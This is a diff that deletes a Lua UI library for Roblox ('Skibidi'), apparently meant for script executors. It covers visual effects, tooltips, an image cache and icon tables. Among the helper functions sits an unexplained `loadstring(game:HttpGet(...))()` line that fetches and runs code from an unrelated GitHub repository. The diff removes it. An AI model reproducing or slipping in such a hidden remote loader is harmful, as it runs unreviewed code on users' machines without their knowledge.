-		ColorSequenceKeypoint.new(0.00, Color3.new(1.00, 1.00, 1.00)),
-		ColorSequenceKeypoint.new(0.48, Color3.new(0.66, 0.66, 0.66)),
-		ColorSequenceKeypoint.new(1.00, Color3.new(0.40, 0.40, 0.40)),
-	})
-	g.Parent = s
-	return s
-end
-
--- Theme-gated glass wash, for the many call sites that want depth only
--- when decoration is switched on.
-local function MakeGloss(parent, strength, rotation)
-	if not Theme.Gloss then return nil end
-	return MakeGlass(parent, strength, rotation)
-end
-
--- An accent fill that reads as lit metal rather than a flat swatch: a
--- two-stop accent gradient with a bright band travelling through it.
--- Used for slider fills, progress fills and the active tab pill.
-local function MakeAccentFill(parent, accent, flow)
-	local a, b = AccentPair(accent)
-	local g = Instance.new("UIGradient")
-	g.Rotation = 90
-	g.Color = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Lighten(a, 0.10)),
-		ColorSequenceKeypoint.new(0.55, b),
-		ColorSequenceKeypoint.new(1.00, Darken(b, 0.10)),
-	})
-	g.Parent = parent
-
-	if not (flow and Theme.Flow) then return g end
-
-	-- The shimmer is a second, wider gradient on a transparent overlay —
-	-- keeping it off `g` means the fill's colour and its highlight can be
-	-- animated independently.
-	local Sheen = Instance.new("Frame")
-	Sheen.Name                   = "SkibidiFlow"
-	Sheen.Size                   = UDim2.new(1, 0, 1, 0)
-	Sheen.BackgroundColor3       = Color3.new(1, 1, 1)
-	Sheen.BorderSizePixel        = 0
-	Sheen.ZIndex                 = (parent.ZIndex or 1) + 1
-	Sheen.Parent                 = parent
-	local c = parent:FindFirstChildOfClass("UICorner")
-	MakeCorner(Sheen, c and c.CornerRadius or UDim.new(1, 0))
-
-	local fg = Instance.new("UIGradient")
-	fg.Transparency = NumberSequence.new({
-		NumberSequenceKeypoint.new(0.00, 1),
-		NumberSequenceKeypoint.new(0.42, 1),
-		NumberSequenceKeypoint.new(0.50, 0.72),
-		NumberSequenceKeypoint.new(0.58, 1),
-		NumberSequenceKeypoint.new(1.00, 1),
-	})
-	fg.Parent = Sheen
-	RegisterFlow(fg, Theme.FlowSpeed)
-	return g, Sheen
-end
-
--- ── Strokes ─────────────────────────────────────────────────
--- A stroke whose colour sweeps around the border. The gradient rides the
--- shared driver above, so an entire screen of panels shares one update.
-local function MakeAnimatedStroke(parent, accent, thickness, speed)
-	local s = MakeStroke(parent, accent or Theme.Accent, thickness or 1.2)
-	if not Theme.AnimatedBorder then return s, nil end
-	local a, b = AccentPair(accent)
-	local g = Instance.new("UIGradient")
-	g.Color = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Darken(b, 0.20)),
-		ColorSequenceKeypoint.new(0.28, a),
-		ColorSequenceKeypoint.new(0.55, Darken(b, 0.24)),
-		ColorSequenceKeypoint.new(0.80, a),
-		ColorSequenceKeypoint.new(1.00, Darken(b, 0.20)),
-	})
-	g.Parent = s
-	RegisterSpin(g, speed or Theme.BorderSpeed)
-	return s, g
-end
-
--- ── Bloom / glow ────────────────────────────────────────────
--- A tinted, blurred copy of the target's rounded-rect silhouette drawn
--- behind it. Lives as a sibling (not a child) so it is not clipped by a
--- ClipsDescendants parent, and mirrors Position/Size every frame the
--- target changes — which covers dragging, tweening and minimising.
-local function MakeGlow(target, color, spread, transparency)
-	if not Theme.Glow then return nil end
-	spread = spread or 22
-
-	local G = Instance.new("ImageLabel")
-	G.Name                   = "SkibidiGlow"
-	G.BackgroundTransparency = 1
-	G.Image                  = Theme.ShadowAsset
-	G.ImageColor3            = color or Theme.Accent
-	G.ImageTransparency      = transparency or Theme.GlowStrength
-	G.ScaleType              = Enum.ScaleType.Slice
-	G.SliceCenter            = Rect.new(49, 49, 450, 450)
-	G.ZIndex                 = math.max((target.ZIndex or 1) - 1, 0)
-	G.Parent                 = target.Parent
-
-	local function sync()
-		local pos, sz = target.Position, target.Size
-		G.Position = UDim2.new(pos.X.Scale, pos.X.Offset - spread,
-		                       pos.Y.Scale, pos.Y.Offset - spread)
-		G.Size     = UDim2.new(sz.X.Scale, sz.X.Offset + spread * 2,
-		                       sz.Y.Scale, sz.Y.Offset + spread * 2)
-	end
-	target:GetPropertyChangedSignal("Position"):Connect(sync)
-	target:GetPropertyChangedSignal("Size"):Connect(sync)
-	target:GetPropertyChangedSignal("Visible"):Connect(function()
-		G.Visible = target.Visible
-	end)
-	target.Destroying:Connect(function() if G.Parent then G:Destroy() end end)
-	sync()
-	return G
-end
-
--- Inner bloom: a halo that follows the target's own silhouette.
---
--- This used to stretch a single 9-slice shadow image behind the control.
--- That image's corners are a fixed rounded rectangle, so behind a
--- pill-shaped toggle track or a circular knob it showed square shoulders
--- poking out of the shape it was meant to hug. It also sat *over* the
--- control: under ZIndexBehavior.Sibling a child always draws above its
--- parent, so the bloom washed across the fill it was framing.
---
--- The halo is drawn as a few concentric outlines instead. Each ring copies
--- the target's own UICorner radius (grown by its own inset), so a pill
--- glows as a pill and a knob glows as a circle; and because a ring is
--- hollow, none of it covers the control.
---
--- Returns a handle rather than an Instance, since the effect is no longer
--- one object:  { SetAlpha(alpha, tweenInfo), SetColor(color3) }
--- alpha 1 = fully hidden, matching the ImageTransparency it replaces.
---
--- Three rings is the trade: the old glow was one instance, this is three
--- frames plus their corner and stroke, on every control that blooms. Four
--- read marginally smoother and did not justify another 25% of instances.
-local GLOW_RINGS = 3
-
--- Every caller's `spread` is scaled by this before the rings are laid out.
--- Halving the spread halves both the halo's total width and each ring's
--- stroke, so the combined thickness drops 50% while the rings keep the
--- same overlap ratio — thinning the strokes alone would open gaps between
--- them and split the falloff back into three visible bands.
-local GLOW_THICKNESS_SCALE = 0.5
-
-local function MakeInnerGlow(target, color, spread, transparency)
-	if not Theme.Glow then return nil end
-	spread = (spread or 10) * GLOW_THICKNESS_SCALE
-
-	local corner = target:FindFirstChildOfClass("UICorner")
-	local radius = corner and corner.CornerRadius or UDim.new(0, 0)
-	-- A scale radius means pill/circle: it stays correct at any size, so
-	-- the rings inherit it as-is. A fixed radius has to grow with each
-	-- ring or the halo's corners go square while the control's stay round.
-	local isPill = radius.Scale > 0
-
-	local step  = spread / GLOW_RINGS
-	local rings = {}
-
-	for i = 1, GLOW_RINGS do
-		local inset = (i - 1) * step
-
-		local R = Instance.new("Frame")
-		R.Name                   = "SkibidiGlowRing"
-		R.AnchorPoint            = Vector2.new(0.5, 0.5)
-		R.Position               = UDim2.new(0.5, 0, 0.5, 0)
-		R.Size                   = UDim2.new(1, inset * 2, 1, inset * 2)
-		R.BackgroundTransparency = 1
-		R.BorderSizePixel        = 0
-		R.ZIndex                 = math.max((target.ZIndex or 1) - 1, 0)
-		R.Parent                 = target
-
-		local c = Instance.new("UICorner")
-		c.CornerRadius = isPill and radius or UDim.new(0, radius.Offset + inset)
-		c.Parent       = R
-
-		local st = Instance.new("UIStroke")
-		-- Slightly thicker than the gap so neighbouring rings overlap and
-		-- read as one falloff rather than three visible bands.
-		st.Thickness    = step * 1.2
-		st.Color        = color or Theme.Accent
-		st.LineJoinMode = Enum.LineJoinMode.Round
-		st.Parent       = R
-
-		rings[i] = { Stroke = st, Falloff = (i - 1) / GLOW_RINGS }
-	end
-
-	local handle = {}
-
-	function handle.SetAlpha(alpha, tweenInfo)
-		for _, r in ipairs(rings) do
-			local a = math.clamp(alpha + (1 - alpha) * r.Falloff, 0, 1)
-			if tweenInfo then
-				TweenService:Create(r.Stroke, tweenInfo, { Transparency = a }):Play()
-			else
-				r.Stroke.Transparency = a
-			end
-		end
-	end
-
-	function handle.SetColor(c)
-		for _, r in ipairs(rings) do r.Stroke.Color = c end
-	end
-
-	handle.SetAlpha(transparency or Theme.GlowStrength or 0.5)
-	return handle
-end
-
--- ── Texture ─────────────────────────────────────────────────
--- Barely-there tiled noise. At the default strength it is invisible as
--- "grain" and only shows up as the absence of flat, banded fills on large
--- surfaces.
-local function MakeGrain(parent)
-	if not Theme.Grain then return nil end
-	local N = Instance.new("ImageLabel")
-	N.Name                   = "SkibidiGrain"
-	N.Size                   = UDim2.new(1, 0, 1, 0)
-	N.BackgroundTransparency = 1
-	N.Image                  = Theme.GrainAsset
-	N.ImageTransparency      = Theme.GrainStrength
-	N.ScaleType              = Enum.ScaleType.Tile
-	N.TileSize               = UDim2.new(0, 128, 0, 128)
-	N.ZIndex                 = 0
-	N.Parent                 = parent
-	return N
-end
-
--- ── Ripple ──────────────────────────────────────────────────
--- Material-style circle expanding from the click point. Needs a clipping
--- host, so it creates its own rather than requiring the caller's frame to
--- clip (which would cut off strokes and glows).
-local function MakeRipple(button, color, radius)
-	if not Theme.Ripple then return end
-
-	local Host = Instance.new("Frame")
-	Host.Name                   = "SkibidiRippleHost"
-	Host.Size                   = UDim2.new(1, 0, 1, 0)
-	Host.BackgroundTransparency = 1
-	Host.BorderSizePixel        = 0
-	Host.ClipsDescendants       = true
-	Host.ZIndex                 = (button.ZIndex or 1)
-	Host.Parent                 = button
-	MakeCorner(Host, UDim.new(0, radius or Theme.CornerRadiusSmall))
-
-	button.MouseButton1Down:Connect(function(x, y)
-		local abs = button.AbsolutePosition
-		local sz  = button.AbsoluteSize
-		local lx, ly = x - abs.X, y - abs.Y
-
-		-- Diameter must reach the farthest corner from the click point,
-		-- otherwise the ripple visibly stops short on off-centre clicks.
-		local far = math.max(
-			math.sqrt(lx ^ 2 + ly ^ 2),
-			math.sqrt((sz.X - lx) ^ 2 + ly ^ 2),
-			math.sqrt(lx ^ 2 + (sz.Y - ly) ^ 2),
-			math.sqrt((sz.X - lx) ^ 2 + (sz.Y - ly) ^ 2))
-		local d = far * 2
-
-		local C = Instance.new("ImageLabel")
-		C.BackgroundTransparency = 1
-		C.Image                  = Theme.RippleAsset
-		C.ImageColor3            = color or Theme.Accent
-		C.ImageTransparency      = 0.72
-		C.AnchorPoint            = Vector2.new(0.5, 0.5)
-		C.Position               = UDim2.new(0, lx, 0, ly)
-		C.Size                   = UDim2.new(0, 0, 0, 0)
-		C.ZIndex                 = Host.ZIndex
-		C.Parent                 = Host
-
-		local info = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-		TweenService:Create(C, info, { Size = UDim2.new(0, d, 0, d), ImageTransparency = 1 }):Play()
-		task.delay(0.5, function() if C.Parent then C:Destroy() end end)
-	end)
-end
-
--- ── Shine sweep ─────────────────────────────────────────────
--- A slanted highlight that crosses the control once per hover. Returns a
--- `play` function so callers can also fire it on click or on state change.
--- `hostParent` is where the sweep layer is parented. It defaults to the
--- target, but a TextButton draws its own label, and under
--- ZIndexBehavior.Sibling every descendant renders above its parent — so a
--- layer inside the button sweeps across the text and the row's decorations
--- instead of behind them. Passing the target's own parent instead puts the
--- sweep on a lower layer, where a lighting effect belongs.
---
--- The band is a UIGradient travelling across a frame that exactly covers
--- the control, not a narrow rotated bar sliding through a clipping host.
--- ClipsDescendants is a screen-axis-aligned scissor that ignores Rotation,
--- so the old slanted bar was never actually clipped: it spilled past the
--- button's edges and swept over whatever sat beside it in the row/stack.
--- A gradient can't leave the frame it paints, so the sweep is now bounded
--- by construction, and a UICorner keeps it off the rounded corners.
-local function MakeShine(target, radius, hostParent)
-	if not Theme.Shine then return function() end end
-
-	local Bar = Instance.new("Frame")
-	Bar.Name                   = "SkibidiShine"
-	Bar.Size                   = UDim2.new(1, 0, 1, 0)
-	Bar.BackgroundColor3       = Color3.new(1, 1, 1)
-	Bar.BorderSizePixel        = 0
-	Bar.ZIndex                 = math.max((target.ZIndex or 1) - 1, 0)
-	Bar.Parent                 = hostParent or target
-	MakeCorner(Bar, UDim.new(0, radius or Theme.CornerRadiusSmall))
-
-	-- Rotating the gradient (rather than the frame) is what slants the
-	-- band. Feathered on both sides so it reads as light, not as a white
-	-- rectangle, and fully transparent at either end so the frame is
-	-- invisible while the sweep is parked off-edge.
-	local grad = Instance.new("UIGradient")
-	grad.Rotation     = 18
-	grad.Offset       = Vector2.new(-1, 0)
-	grad.Transparency = NumberSequence.new({
-		NumberSequenceKeypoint.new(0.00, 1),
-		NumberSequenceKeypoint.new(0.42, 1),
-		NumberSequenceKeypoint.new(0.50, 0.80),
-		NumberSequenceKeypoint.new(0.58, 1),
-		NumberSequenceKeypoint.new(1.00, 1),
-	})
-	grad.Parent = Bar
-
-	local playing = false
-	local function play()
-		if playing or not Bar.Parent then return end
-		playing = true
-		grad.Offset = Vector2.new(-1, 0)
-		local t = TweenService:Create(grad,
-			TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-			{ Offset = Vector2.new(1, 0) })
-		t.Completed:Connect(function() playing = false end)
-		t:Play()
-	end
-
-	target.MouseEnter:Connect(play)
-	return play
-end
-
--- ── Spinner ─────────────────────────────────────────────────
--- Indeterminate loading ring. Rotates on the shared driver via a dummy
--- gradient would be wrong here (we need the *image* to spin), so it owns a
--- tween loop that stops the moment it's hidden or destroyed.
-local function MakeSpinner(parent, size, color)
-	local S = Instance.new("ImageLabel")
-	S.Name                   = "SkibidiSpinner"
-	S.AnchorPoint            = Vector2.new(0.5, 0.5)
-	S.Position               = UDim2.new(0.5, 0, 0.5, 0)
-	S.Size                   = UDim2.new(0, size or 18, 0, size or 18)
-	S.BackgroundTransparency = 1
-	S.Image                  = Theme.SpinnerAsset
-	S.ImageColor3            = color or Theme.Accent
-	S.Parent                 = parent
-
-	task.spawn(function()
-		while S.Parent do
-			if S.Visible then
-				S.Rotation = (S.Rotation + 9) % 360
-			end
-			RunService.Heartbeat:Wait()
-		end
-	end)
-	return S
-end
-
--- ── Entrance ────────────────────────────────────────────────
--- Rows settle into place instead of appearing all at once.
---
--- The stagger index is read from how many siblings already exist rather
--- than being passed in, so a tab built top-to-bottom in one pass cascades
--- for free and no call site has to keep a counter. The delay is capped so
--- a fifty-row tab doesn't take two seconds to finish arriving.
---
--- UIScale is deliberate: a UIListLayout measures a child's *Size*, not its
--- rendered scale, so this can never disturb the layout it animates inside.
-local function PlayEntrance(inst, index)
-	if not Theme.Stagger then return end
-	if not index then
-		local n = 0
-		local parent = inst.Parent
-		if parent then
-			for _, c in ipairs(parent:GetChildren()) do
-				if c ~= inst and c:IsA("GuiObject") then n = n + 1 end
-			end
-		end
-		index = n
-	end
-	local delaySec = math.min(index * 0.028, 0.30)
-
-	local scale = Instance.new("UIScale")
-	scale.Scale  = 0.965
-	scale.Parent = inst
-
-	-- Fading the outline in alongside the scale is what turns a bare pop
-	-- into something that reads as "settling": the edge resolves last.
-	local stroke = inst:FindFirstChildOfClass("UIStroke")
-	local restAlpha = stroke and stroke.Transparency or 0
-	if stroke then stroke.Transparency = 1 end
-
-	task.delay(delaySec, function()
-		if not inst.Parent then return end
-		TweenService:Create(scale, TweenPop, { Scale = 1 }):Play()
-		if stroke and stroke.Parent then
-			TweenService:Create(stroke, TweenSoft, { Transparency = restAlpha }):Play()
-		end
-	end)
-end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
--- Some rows (Section headers, Dropdown/ColorPicker heads) are clickable
--- TextButtons that span edge-to-edge inside a rounded card, with no
--- corner/inset of their own. Tinting them directly on hover causes two
--- problems: the very first hover flashes because BackgroundColor3 was
--- never initialized (it defaults to white, so the tween starts from
--- white instead of the theme colour), and the opaque fill paints
--- straight over the card's rounded corner + outline stroke since it
--- touches the same edge pixels.
---
--- This creates a small inset, independently-rounded highlight layer
--- inside Head instead of tinting Head itself, so hovering can never
--- cover the parent card's corners/stroke, and pre-seeds its colour so
--- there's nothing to flash from.
-local function MakeHoverFill(Head, inset, radius)
-	local Fill = Instance.new("Frame")
-	Fill.Size                   = UDim2.new(1, -inset * 2, 1, -inset * 2)
-	Fill.Position               = UDim2.new(0, inset, 0, inset)
-	Fill.BackgroundColor3       = Theme.Bg2
-	Fill.BackgroundTransparency = 1
-	Fill.BorderSizePixel        = 0
-	Fill.ZIndex                 = 0   -- render behind all card content
-	Fill.Parent                 = Head
-	MakeCorner(Fill, UDim.new(0, radius or 6))
-
-	-- A short accent tick that grows out of the left edge on hover. It
-	-- lives inside Fill so it inherits the same inset and can never touch
-	-- the parent card's corners either.
-	local Tick = Instance.new("Frame")
-	Tick.Size             = UDim2.new(0, 2, 0, 0)
-	Tick.Position         = UDim2.new(0, 0, 0.5, 0)
-	Tick.AnchorPoint      = Vector2.new(0, 0.5)
-	Tick.BackgroundColor3 = Theme.Accent
-	Tick.BorderSizePixel  = 0
-	Tick.ZIndex           = 1
-	Tick.Parent           = Fill
-	MakeCorner(Tick, UDim.new(1, 0))
-
-	Head.MouseEnter:Connect(function()
-		TweenService:Create(Fill, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-		Fill.BackgroundTransparency = 0
-		TweenService:Create(Tick, TweenSpring, { Size = UDim2.new(0, 2, 0.55, 0) }):Play()
-	end)
-	Head.MouseLeave:Connect(function()
-		TweenService:Create(Fill, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-		TweenService:Create(Tick, TweenFast, { Size = UDim2.new(0, 2, 0, 0) }):Play()
-		task.delay(0.14, function() Fill.BackgroundTransparency = 1 end)
-	end)
-
-	return Fill
-end
-
--- Connects a service-level signal (UserInputService etc.) and disconnects
--- it automatically when `owner` is destroyed. Without this, every slider,
--- color picker, keybind and panel drag handler would keep its global
--- connection alive forever after its GUI is gone — a slow leak for any
--- script that creates panels repeatedly.
-local function ConnectScoped(owner, signal, fn)
-	local conn = signal:Connect(fn)
-	owner.Destroying:Connect(function()
-		conn:Disconnect()
-	end)
-	return conn
-end
-
--- ── Overlay registry ────────────────────────────────────────
--- At most one expanding overlay (Dropdown list / ColorPicker panel) is
--- open at a time: opening one closes the previous, and clicking anywhere
--- outside the open overlay's card closes it. The outside-click watcher
--- only exists while an overlay is open, so idle cost is zero.
-local _openOverlay  = nil   -- { Card = GuiObject, Close = fn }
-local _overlayWatch = nil
-
-local function OverlayClosed(card)
-	if _openOverlay and _openOverlay.Card == card then
-		_openOverlay = nil
-		if _overlayWatch then
-			_overlayWatch:Disconnect()
-			_overlayWatch = nil
-		end
-	end
-end
-
-local function OverlayOpened(card, closeFn)
-	if _openOverlay and _openOverlay.Card ~= card then
-		_openOverlay.Close()
-	end
-	_openOverlay = { Card = card, Close = closeFn }
-	if not _overlayWatch then
-		_overlayWatch = UserInputService.InputBegan:Connect(function(inp)
-			if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			local o = _openOverlay
-			if not o or not o.Card.Parent then return end
-			local p, s = o.Card.AbsolutePosition, o.Card.AbsoluteSize
-			local x, y = inp.Position.X, inp.Position.Y
-			if x < p.X or x > p.X + s.X or y < p.Y or y > p.Y + s.Y then
-				o.Close()
-			end
-		end)
-	end
-end
-
--- ── Config flags ────────────────────────────────────────────
--- Components created with Options.Flag = "someKey" register themselves
--- here so SaveConfig/LoadConfig can persist and restore their values.
--- Purely opt-in: components without a Flag are never registered.
-local Flags = {}
-Skibidi.Flags = Flags
-
--- ── Panel registry ──────────────────────────────────────────
--- Every ScreenGui the library creates is tracked here so
--- Skibidi.Unload() can tear the whole UI down in one call.
-local _allGuis = {}
-
--- ── Tooltip ─────────────────────────────────────────────────
--- One shared tooltip for the whole library. Components opt in with
--- Options.Tooltip = "text"; it follows the mouse, clamps to the screen
--- and hides itself when the hovered element dies.
-local _tooltipSg, _tooltipFrame, _tooltipLbl
-
-local function _ensureTooltip()
-	if _tooltipSg and _tooltipSg.Parent then return end
-	_tooltipSg = Instance.new("ScreenGui")
-	_tooltipSg.Name           = "SkibidiTooltip"
-	_tooltipSg.ResetOnSpawn   = false
-	_tooltipSg.DisplayOrder   = 2000
-	_tooltipSg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	_tooltipSg.Parent         = PlayerGui
-
-	_tooltipFrame = Instance.new("Frame")
-	_tooltipFrame.AutomaticSize          = Enum.AutomaticSize.XY
-	_tooltipFrame.BackgroundColor3       = Theme.Bg0
-	_tooltipFrame.BackgroundTransparency = 0.05
-	_tooltipFrame.BorderSizePixel        = 0
-	_tooltipFrame.Visible                = false
-	_tooltipFrame.Parent                 = _tooltipSg
-	MakeCorner(_tooltipFrame, UDim.new(0, Theme.CornerRadiusXs))
-	MakeEdge(_tooltipFrame, Theme.AccentDim, 1)
-	MakeGloss(_tooltipFrame, 0.10)
-	MakePadding(_tooltipFrame, 8, 8, 5, 5)
-
-	_tooltipLbl = Instance.new("TextLabel")
-	_tooltipLbl.AutomaticSize          = Enum.AutomaticSize.XY
-	_tooltipLbl.BackgroundTransparency = 1
-	_tooltipLbl.Font                   = Theme.FontRegular
-	_tooltipLbl.TextSize               = Theme.SmallSize
-	_tooltipLbl.TextColor3             = Theme.TextPrimary
-	_tooltipLbl.Parent                 = _tooltipFrame
-end
-
-local function _positionTooltip()
-	local loc   = UserInputService:GetMouseLocation()
-	local inset = GuiService:GetGuiInset()
-	local x, y  = loc.X - inset.X + 16, loc.Y - inset.Y + 14
-	local screen, sz = _tooltipSg.AbsoluteSize, _tooltipFrame.AbsoluteSize
-	x = math.max(0, math.min(x, screen.X - sz.X - 4))
-	y = math.max(0, math.min(y, screen.Y - sz.Y - 4))
-	_tooltipFrame.Position = UDim2.fromOffset(x, y)
-end
-
-local function AttachTooltip(target, text)
-	if not text or text == "" then return end
-	target.MouseEnter:Connect(function()
-		_ensureTooltip()
-		_tooltipLbl.Text      = text
-		_tooltipFrame.Visible = true
-		_positionTooltip()
-	end)
-	target.MouseMoved:Connect(function()
-		if _tooltipFrame and _tooltipFrame.Visible then _positionTooltip() end
-	end)
-	target.MouseLeave:Connect(function()
-		if _tooltipFrame then _tooltipFrame.Visible = false end
-	end)
-	target.Destroying:Connect(function()
-		if _tooltipFrame then _tooltipFrame.Visible = false end
-	end)
-end
-
--- Default parent used by CreatePanel when Options.Parent is omitted.
--- Overridable in one place via Skibidi.Init({ Parent = someInstance }).
-local DefaultParent = PlayerGui
-
--- ============================================================
--- FetchCachedImage(url, fileName) → asset string | nil
--- Downloads a web image once, caches it in the executor workspace
--- via writefile, and returns a getcustomasset path for it. Later
--- runs skip the download and read the cached file. Returns nil
--- (never throws) when the executor lacks file/asset APIs or the
--- request fails, so callers can keep a rbxassetid fallback.
--- ============================================================
-local function FetchCachedImage(url, fileName)
-	if type(getcustomasset) ~= "function" then return nil end
-
-	local cached = type(isfile) == "function" and isfile(fileName)
-	if not cached then
-		if type(writefile) ~= "function" then return nil end
-
-		local body
-		local req = (type(request) == "function" and request)
-			or (type(http_request) == "function" and http_request)
-			or (type(syn) == "table" and type(syn.request) == "function" and syn.request)
-		if req then
-			local ok, res = pcall(req, { Url = url, Method = "GET" })
-			if ok and type(res) == "table" and res.Success ~= false and type(res.Body) == "string" then
-				body = res.Body
-			end
-		end
-		if not body then
-			local ok, res = pcall(game.HttpGet, game, url)
-			if ok and type(res) == "string" then body = res end
-		end
-		if not body or #body == 0 then return nil end
-
-		local okWrite = pcall(writefile, fileName, body)
-		if not okWrite then return nil end
-	end
-
-	local okAsset, asset = pcall(getcustomasset, fileName)
-	if okAsset and type(asset) == "string" and #asset > 0 then
-		return asset
-	end
-	return nil
-end
-
--- ============================================================
--- ICONS
--- Lucide glyphs, served from the same asset set WindUI ships with
--- (github.com/Footagesus/Icons). Every component that takes an
--- `Icon` option accepts any of:
---   "house"                lucide name   (see lucide.dev/icons)
---   "lucide:house"         WindUI-style pack prefix
---   "rbxassetid://123"     raw asset id
---   123                    numeric asset id
--- A few hundred common names are embedded below so the usual icons
--- need no HTTP request. Any other lucide name is fetched from the
--- full ~1700-glyph map the first time it is asked for; the label is
--- created immediately and fills in when the download lands.
---
--- Public API:
---   Skibidi.ResolveIcon(spec)          -> asset id string | nil (sync)
---   Skibidi.PreloadIcons([pack], [cb]) -> warm the full map up front
---   Skibidi.AddIcons([pack], {name = id, ...})
---   Skibidi.CreateIcon(parent, spec, size, color) -> { Label, Set(spec) }
---   Skibidi.SetIcon(imageLabel, spec)
--- ============================================================
-local ICON_PACK_URLS = {
-	lucide = "https://raw.githubusercontent.com/Footagesus/Icons/refs/heads/main/lucide/dist/Icons.lua",
-}
-local DEFAULT_ICON_PACK = "lucide"
-
--- Asset ids are stored without the "rbxassetid://" prefix to keep the
--- table compact; lookupIcon puts it back.
-local IconPacks = {
-	lucide = {
-		["house"] = "98755624629571", ["settings"] = "80758916183665", ["settings-2"] = "135684703553372",
-		["cog"] = "116544501716299", ["sliders-horizontal"] = "85538382643347",
-		["sliders-vertical"] = "101190569086853", ["user"] = "81589895647169", ["users"] = "115398113982385",
-		["user-round"] = "136485052187963", ["users-round"] = "103005444008339", ["user-plus"] = "118514469915884",
-		["user-minus"] = "126976941957511", ["user-check"] = "81775205032725", ["user-x"] = "139748155894754",
-		["search"] = "121018724060431", ["x"] = "110786993356448", ["check"] = "93898873302694",
-		["plus"] = "111774323017047", ["minus"] = "118026365011536", ["menu"] = "77021539815611",
-		["info"] = "124560466474914", ["circle-alert"] = "83898160590116", ["triangle-alert"] = "125920361880643",
-		["octagon-alert"] = "140438367956051", ["circle-check"] = "85262178816537",
-		["circle-check-big"] = "93202927221730", ["circle-x"] = "76821953846248",
-		["circle-plus"] = "113157136350384", ["circle-minus"] = "133556159576809",
-		["circle-slash"] = "125206439913049", ["ban"] = "90767043015246",
-		["circle-question-mark"] = "97516698664325", ["badge-check"] = "76078495178149",
-		["badge-alert"] = "101829200081951", ["badge-info"] = "131995373201472", ["bell"] = "97392696311902",
-		["bell-ring"] = "94612128913941", ["bell-off"] = "78560046118930", ["star"] = "136141469398409",
-		["heart"] = "116559368303288", ["heart-pulse"] = "129352925579546", ["zap"] = "130551565616516",
-		["zap-off"] = "81385483183652", ["eye"] = "100033680381365", ["eye-off"] = "135928786788378",
-		["eye-closed"] = "111063268625789", ["lock"] = "134724289526879", ["lock-open"] = "93597915325122",
-		["lock-keyhole"] = "78672912777756", ["key"] = "96510194465420", ["key-round"] = "83619031955390",
-		["shield"] = "110987169760162", ["shield-check"] = "87354736164608", ["shield-alert"] = "114995877719925",
-		["shield-off"] = "133426959132690", ["shield-ban"] = "108765041044649", ["sword"] = "124448418211665",
-		["swords"] = "81872698913435", ["crosshair"] = "134242818164054", ["target"] = "87563802520297",
-		["gamepad"] = "121607283959010", ["gamepad-2"] = "92483947987410", ["joystick"] = "99416790224739",
-		["play"] = "135609604299893", ["pause"] = "74873705394436", ["square"] = "86304921356806",
-		["skip-forward"] = "124844823753990", ["skip-back"] = "70466132711334",
-		["circle-play"] = "120408917249739", ["circle-pause"] = "139337739700879",
-		["circle-stop"] = "87400503942659", ["square-check"] = "134682053539509", ["square-x"] = "125136183850190",
-		["refresh-cw"] = "138133190015277", ["refresh-ccw"] = "117913330389477", ["rotate-cw"] = "84183336178654",
-		["rotate-ccw"] = "110116685948665", ["repeat"] = "121886242955173", ["shuffle"] = "132382786975101",
-		["rewind"] = "95205297521988", ["fast-forward"] = "121615540167909", ["download"] = "134814648082393",
-		["upload"] = "138212042425501", ["save"] = "126116963775616", ["folder"] = "80846616596607",
-		["folder-open"] = "76018996254888", ["file"] = "74748492079329", ["file-text"] = "90496405707281",
-		["file-code"] = "130978036895504", ["files"] = "102806336233202", ["code"] = "107380207681249",
-		["code-xml"] = "130150477351734", ["terminal"] = "106783148545356", ["cpu"] = "77549309870247",
-		["database"] = "126791525623846", ["server"] = "92188766517878", ["hard-drive"] = "88183305858463",
-		["globe"] = "114238209622913", ["earth"] = "76231597751076", ["wifi"] = "104669375183960",
-		["wifi-off"] = "74113634330106", ["link"] = "131607023382430", ["link-2"] = "86072351557466",
-		["unlink"] = "139835795227752", ["external-link"] = "129331830773832", ["copy"] = "78979572434545",
-		["clipboard"] = "89601995828423", ["clipboard-check"] = "92649798577170", ["scissors"] = "118665510911274",
-		["trash"] = "106723740584310", ["trash-2"] = "109843431391323", ["pencil"] = "137986121120732",
-		["pen"] = "72037878096321", ["pen-line"] = "109108135755303", ["eraser"] = "133957773112410",
-		["wrench"] = "112148279212860", ["hammer"] = "83545120140895", ["bug"] = "83626408925438",
-		["flask-conical"] = "128406680901165", ["beaker"] = "80902539995520", ["sparkles"] = "138635884129147",
-		["sparkle"] = "111044800239623", ["wand"] = "114580617777835", ["wand-sparkles"] = "82546429942392",
-		["flame"] = "98218034436456", ["snowflake"] = "101235206534566", ["sun"] = "110150589884127",
-		["moon"] = "83380517901735", ["cloud"] = "121226497050352", ["cloud-off"] = "131907154501444",
-		["cloud-download"] = "121435581993566", ["cloud-upload"] = "93307473217005", ["map"] = "95107167260947",
-		["map-pin"] = "84279202219901", ["map-pinned"] = "103963788475034", ["compass"] = "115123411028382",
-		["navigation"] = "79308213542922", ["locate"] = "84467676590391", ["locate-fixed"] = "137367361548433",
-		["move"] = "116138709011735", ["move-horizontal"] = "88513523439149", ["move-vertical"] = "86234730730899",
-		["arrow-up"] = "89282378235317", ["arrow-down"] = "98764963621439", ["arrow-left"] = "102531941843733",
-		["arrow-right"] = "113692007244654", ["arrow-up-right"] = "129280608535523",
-		["arrow-left-right"] = "131324733048447", ["arrow-up-down"] = "81019887641527",
-		["chevron-up"] = "122444883127455", ["chevron-down"] = "134243273101015",
-		["chevron-left"] = "73780377692148", ["chevron-right"] = "92473583511724",
-		["chevrons-up"] = "100467452364672", ["chevrons-down"] = "100524612205956",
-		["chevrons-left"] = "82617201744347", ["chevrons-right"] = "139121276490483", ["list"] = "113179976918783",
-		["list-checks"] = "99809353635593", ["layout-grid"] = "81344910161871",
-		["layout-dashboard"] = "139929981863901", ["layout-list"] = "87462136296578",
-		["layers"] = "81973586053257", ["box"] = "101768155599700", ["package"] = "97261141732706",
